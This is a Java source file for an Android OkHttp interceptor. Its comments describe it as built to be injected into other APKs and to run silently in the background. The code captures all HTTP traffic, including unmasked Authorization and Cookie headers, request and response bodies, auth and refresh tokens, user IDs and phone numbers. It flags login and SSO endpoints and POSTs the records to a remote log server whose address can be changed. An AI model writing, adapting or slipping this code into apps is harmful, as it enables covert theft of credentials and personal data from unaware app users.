package com.httpinterceptor.interceptor;

import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import okhttp3.Headers;
import okhttp3.Interceptor;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import okhttp3.ResponseBody;
import okio.Buffer;
import okio.BufferedSource;

/**
 * 远程日志拦截器
 *
 * 用于注入到其他 APK 中，将 HTTP 请求日志发送到远程服务器
 * 无 UI 依赖，纯后台运行
 *
 * 功能：
 * 1. 拦截所有 HTTP/HTTPS 请求
 * 2. 记录请求/响应详情
 * 3. 检测 Token 和敏感信息
 * 4. 发送日志到远程服务器
 */
public class RemoteLoggingInterceptor implements Interceptor {

    private static final String TAG = "HttpInterceptor";

    // 日志服务器地址
    private static String logServerUrl = "http://127.0.0.1:8088/api/log";

    // 发送线程池
    private final ExecutorService executor = Executors.newFixedThreadPool(2);

    // 日期格式
    private final SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.getDefault());

    // Token 检测模式
    private static final List<TokenPattern> TOKEN_PATTERNS = new ArrayList<>();

    // 敏感 Header 名称
    private static final String[] SENSITIVE_HEADERS = {
        "authorization", "cookie", "x-auth-token", "api-key", "token",
        "x-access-token", "bearer", "session", "credential"
    };

    static {
        // 初始化 Token 匹配模式
        TOKEN_PATTERNS.add(new TokenPattern("OAuth Token", Pattern.compile(".*/(oauth|auth)/token.*", Pattern.CASE_INSENSITIVE)));
        TOKEN_PATTERNS.add(new TokenPattern("Login", Pattern.compile(".*/login.*", Pattern.CASE_INSENSITIVE)));
        TOKEN_PATTERNS.add(new TokenPattern("Session", Pattern.compile(".*/session.*", Pattern.CASE_INSENSITIVE)));
        TOKEN_PATTERNS.add(new TokenPattern("API Auth", Pattern.compile(".*/api/.*/auth.*", Pattern.CASE_INSENSITIVE)));
        TOKEN_PATTERNS.add(new TokenPattern("User Profile", Pattern.compile(".*/user/profile.*", Pattern.CASE_INSENSITIVE)));
        TOKEN_PATTERNS.add(new TokenPattern("Refresh Token", Pattern.compile(".*refresh.*token.*", Pattern.CASE_INSENSITIVE)));
        TOKEN_PATTERNS.add(new TokenPattern("1FA Token", Pattern.compile(".*/tokens/1fa.*", Pattern.CASE_INSENSITIVE)));
        TOKEN_PATTERNS.add(new TokenPattern("SSO Token", Pattern.compile(".*/sso.*", Pattern.CASE_INSENSITIVE)));
    }

    /**
     * 设置日志服务器地址
     */
    public static void setLogServerUrl(String url) {
        logServerUrl = url;
        Log.i(TAG, "Log server URL set to: " + url);
    }

    @Override
    public Response intercept(Chain chain) throws IOException {
        Request request = chain.request();
        long startTime = System.nanoTime();
        String timestamp = dateFormat.format(new Date());

        // 创建日志对象
        JSONObject logData = new JSONObject();
        try {
            logData.put("timestamp", timestamp);
            logData.put("url", request.url().toString());
            logData.put("method", request.method());
            logData.put("protocol", chain.connection() != null ?
                chain.connection().protocol().toString() : "HTTP/1.1");

            // 记录请求头
            JSONObject requestHeaders = headersToJson(request.headers());
            logData.put("request_headers", requestHeaders);

            // 检查请求头中的敏感信息
            checkSensitiveHeaders(request.headers(), logData);

            // 记录请求体
            String requestBody = getRequestBody(request);
            if (requestBody != null && !requestBody.isEmpty()) {
                logData.put("request_body", requestBody);
            }

        } catch (JSONException e) {
            Log.e(TAG, "Error building request log", e);
        }

        // 执行请求
        Response response;
        try {
            response = chain.proceed(request);
        } catch (IOException e) {
            try {
                logData.put("error", e.getMessage());
                logData.put("duration_ms", TimeUnit.NANOSECONDS.toMillis(System.nanoTime() - startTime));
            } catch (JSONException je) {
                Log.e(TAG, "Error logging error", je);
            }
            sendLogAsync(logData);
            throw e;
        }

        // 记录响应
        try {
            long duration = TimeUnit.NANOSECONDS.toMillis(System.nanoTime() - startTime);
            logData.put("duration_ms", duration);
            logData.put("status_code", response.code());
            logData.put("status_message", response.message());

            // 记录响应头
            JSONObject responseHeaders = headersToJson(response.headers());
            logData.put("response_headers", responseHeaders);

            // 记录响应体
            ResponseBody responseBody = response.body();
            if (responseBody != null) {
                BufferedSource source = responseBody.source();
                source.request(Long.MAX_VALUE);
                Buffer buffer = source.getBuffer().clone();

                MediaType contentType = responseBody.contentType();
                if (contentType != null && isTextContent(contentType)) {
                    String bodyString = buffer.readString(StandardCharsets.UTF_8);
                    logData.put("response_body", bodyString);

                    // 检测 Token
                    checkForTokens(request.url().toString(), bodyString, logData);
                }
            }

            Log.d(TAG, String.format("[%s] %s %s - %d (%dms)",
                timestamp, request.method(), request.url(), response.code(), duration));

        } catch (JSONException e) {
            Log.e(TAG, "Error building response log", e);
        }

        // 异步发送日志
        sendLogAsync(logData);

        return response;
    }

    /**
     * 获取请求体
     */
    private String getRequestBody(Request request) {
        RequestBody body = request.body();
        if (body == null) {
            return null;
        }

        try {
            Buffer buffer = new Buffer();
            body.writeTo(buffer);
            MediaType contentType = body.contentType();

            if (contentType != null && isTextContent(contentType)) {
                return buffer.readString(StandardCharsets.UTF_8);
            } else {
                return "[Binary data: " + buffer.size() + " bytes]";
            }
        } catch (IOException e) {
            return "[Error reading body: " + e.getMessage() + "]";
        }
    }

    /**
     * Headers 转 JSON
     */
    private JSONObject headersToJson(Headers headers) {
        JSONObject json = new JSONObject();
        try {
            for (int i = 0; i < headers.size(); i++) {
                json.put(headers.name(i), headers.value(i));
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error converting headers to JSON", e);
        }
        return json;
    }

    /**
     * 检查敏感 Header
     */
    private void checkSensitiveHeaders(Headers headers, JSONObject logData) {
        StringBuilder tokenInfo = new StringBuilder();
        boolean found = false;

        for (int i = 0; i < headers.size(); i++) {
            String name = headers.name(i).toLowerCase();
            for (String sensitive : SENSITIVE_HEADERS) {
                if (name.contains(sensitive)) {
                    found = true;
                    tokenInfo.append("Header: ").append(headers.name(i))
                        .append(" = ").append(maskValue(headers.value(i))).append("\n");
                    break;
                }
            }
        }

        if (found) {
            try {
                logData.put("token_detected", true);
                if (logData.has("token_info")) {
                    logData.put("token_info", logData.getString("token_info") + "\n" + tokenInfo.toString());
                } else {
                    logData.put("token_info", tokenInfo.toString());
                }
            } catch (JSONException e) {
                Log.e(TAG, "Error adding token info", e);
            }
        }
    }

    /**
     * 检查响应中的 Token
     */
    private void checkForTokens(String url, String body, JSONObject logData) {
        // 检查 URL 模式
        for (TokenPattern pattern : TOKEN_PATTERNS) {
            if (pattern.pattern.matcher(url).matches()) {
                try {
                    logData.put("token_detected", true);
                    StringBuilder tokenInfo = new StringBuilder();

                    if (logData.has("token_info")) {
                        tokenInfo.append(logData.getString("token_info")).append("\n");
                    }

                    tokenInfo.append("URL Pattern: ").append(pattern.name).append("\n");

                    // 尝试从响应体中提取 Token 字段
                    tokenInfo.append(extractTokenFields(body));

                    logData.put("token_info", tokenInfo.toString());
                } catch (JSONException e) {
                    Log.e(TAG, "Error adding token info", e);
                }
                break;
            }
        }
    }

    /**
     * 从 JSON 响应中提取 Token 字段
     */
    private String extractTokenFields(String body) {
        StringBuilder result = new StringBuilder();
        String[] tokenFields = {
            "token", "access_token", "accessToken",
            "refresh_token", "refreshToken",
            "id_token", "idToken",
            "auth_token", "authToken",
            "session_token", "sessionToken",
            "bearer", "jwt", "userId", "phoneNumber"
        };

        try {
            JSONObject json = new JSONObject(body);
            for (String field : tokenFields) {
                if (json.has(field)) {
                    String value = json.optString(field);
                    if (!value.isEmpty()) {
                        result.append(field).append(": ").append(maskValue(value)).append("\n");
                    }
                }
            }
        } catch (JSONException e) {
            // 尝试正则匹配
            Pattern tokenPattern = Pattern.compile("\"(access_token|token|refresh_token)\"\\s*:\\s*\"([^\"]+)\"");
            Matcher matcher = tokenPattern.matcher(body);
            while (matcher.find()) {
                result.append(matcher.group(1)).append(": ")
                    .append(maskValue(matcher.group(2))).append("\n");
            }
        }

        return result.toString();
    }

    /**
     * 遮蔽敏感值
     */
    private String maskValue(String value) {
        if (value == null || value.length() <= 10) {
            return "****";
        }
        return value.substring(0, 5) + "..." + value.substring(value.length() - 5);
    }

    /**
     * 判断是否是文本内容
     */
    private boolean isTextContent(MediaType contentType) {
        String type = contentType.type();
        String subtype = contentType.subtype();

        return "text".equals(type) ||
               "json".equals(subtype) ||
               "xml".equals(subtype) ||
               "html".equals(subtype) ||
               "javascript".equals(subtype) ||
               subtype.endsWith("+json") ||
               subtype.endsWith("+xml");
    }

    /**
     * 异步发送日志
     */
    private void sendLogAsync(final JSONObject logData) {
        executor.submit(() -> {
            HttpURLConnection connection = null;
            try {
                URL url = new URL(logServerUrl);
                connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                connection.setConnectTimeout(5000);
                connection.setReadTimeout(5000);
                connection.setDoOutput(true);

                byte[] body = logData.toString().getBytes(StandardCharsets.UTF_8);
                connection.setFixedLengthStreamingMode(body.length);

                try (OutputStream os = connection.getOutputStream()) {
                    os.write(body);
                }

                int responseCode = connection.getResponseCode();
                if (responseCode != 200) {
                    Log.w(TAG, "Log server returned: " + responseCode);
                }
            } catch (Exception e) {
                Log.w(TAG, "Failed to send log: " + e.getMessage());
            } finally {
                if (connection != null) {
                    connection.disconnect();
                }
            }
        });
    }

    /**
     * Token 匹配模式
     */
    private static class TokenPattern {
        String name;
        Pattern pattern;

        TokenPattern(String name, Pattern pattern) {
            this.name = name;
            this.pattern = pattern;
        }
    }
}
